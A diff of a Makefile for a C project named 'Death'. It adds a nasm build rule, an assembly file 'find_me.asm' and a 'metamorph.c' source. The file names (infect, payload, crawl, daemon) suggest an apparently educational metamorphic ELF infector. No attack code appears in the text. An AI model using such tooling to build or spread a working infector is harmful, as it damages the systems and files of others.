@@ -1,6 +1,7 @@
 NAME :=	Death
 
 CC :=	cc
+ASM :=	nasm
 CFLAGS := -MP -MMD -Wall -Wextra -Werror # -fsanitize=address -fno-omit-frame-pointer
 
 ###
@@ -9,10 +10,10 @@ INCLUDE_DIRS :=	inc/				\
 				inc/server/			\
 				inc/list/			\
 
-C_SRCS :=	src/main.c				\
-		src/infect.c				\
+C_SRCS := src/infect.c				\
 		src/check.c					\
 		src/crawl.c					\
+		src/metamorph.c				\
 		src/payload.c				\
 		src/utils.c					\
 		src/daemon.c				\
@@ -26,6 +27,9 @@ C_SRCS :=	src/main.c				\
 		src/list/list.c				\
 		src/run_check.c				\
 		src/fingerprint.c			\
+		src/main.c			\
+
+ASM_SRCS := src/find_me.asm
 
 ###
 
@@ -37,6 +41,7 @@ OBJ_DIR :=	obj
 
 
 OBJS =	$(C_SRCS:%.c=$(OBJ_DIR)/%.o)
+OBJS +=	$(ASM_SRCS:%.asm=$(OBJ_DIR)/%.o)
 DEPS =	$(C_SRCS:%.c=$(OBJ_DIR)/%.d)
 
 ###
@@ -60,6 +65,12 @@ all: $(NAME)
 $(NAME): $(OBJS)
 	@echo 'Linking $(_BOLD)$(NAME)$(_RESET)'
 	@$(CC) $(CFLAGS) -no-pie $(LFLAGS) $(INCLUDE_DIRS) -o $@ $^
+
+$(OBJ_DIR)/%.o: %.asm
+	@mkdir -p $(dir $@)
+	@echo 'Compiling $(_BOLD)$<$(_RESET)'
+	@$(ASM) -f elf64 $< -o $@
+	@echo 'Compiled $(_BOLD)$<$(_RESET)'
 
 $(OBJ_DIR)/%.o: %.c
 	@mkdir -p $(dir $@)
